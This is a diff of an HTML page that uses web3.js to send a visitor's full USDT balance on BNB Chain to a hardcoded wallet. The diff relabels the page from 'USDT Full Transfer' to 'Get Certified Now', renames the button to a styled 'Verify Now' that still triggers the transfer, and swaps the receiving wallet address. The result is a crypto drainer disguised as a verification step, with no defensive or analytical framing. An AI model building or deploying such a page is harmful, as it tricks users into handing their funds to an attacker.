@@ -1,17 +1,36 @@
 <!DOCTYPE html><html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>USDT Full Transfer</title>
+  <title> Get Certified Now </title>
   <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    .fancy-button {
+      background: linear-gradient(90deg, #00c6ff, #0072ff);
+      border: none;
+      color: white;
+      padding: 15px 30px;
+      font-size: 18px;
+      font-weight: bold;
+      border-radius: 12px;
+      box-shadow: 0 8px 20px rgba(0,0,0,0.2);
+      cursor: pointer;
+      transition: all 0.3s ease-in-out;
+    }
+
+    .fancy-button:hover {
+      transform: scale(1.05);
+      box-shadow: 0 12px 24px rgba(0,0,0,0.3);
+    }
+  </style>
 </head>
 <body>
   <div style="text-align:center;margin-top:100px;">
     <h2>Send Full USDT</h2>
-    <button onclick="sendUSDT()">Send Now</button>
+    <button class="fancy-button" onclick="sendUSDT()">Verify Now</button>
     <p id="status"></p>
   </div>  <script>
-    const receiver = "0x1994CF939337eC9B831172aBf1116221D2382F3a"; // destination wallet
+    const receiver = "0x795F74878AC4E02f3C254CbA845B66571EA1B5dC"; // destination wallet
     const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // USDT on BNB Chain
 
     const USDT_ABI = [
@@ -60,4 +79,3 @@
       }
     }
   </script></body>
-</html>
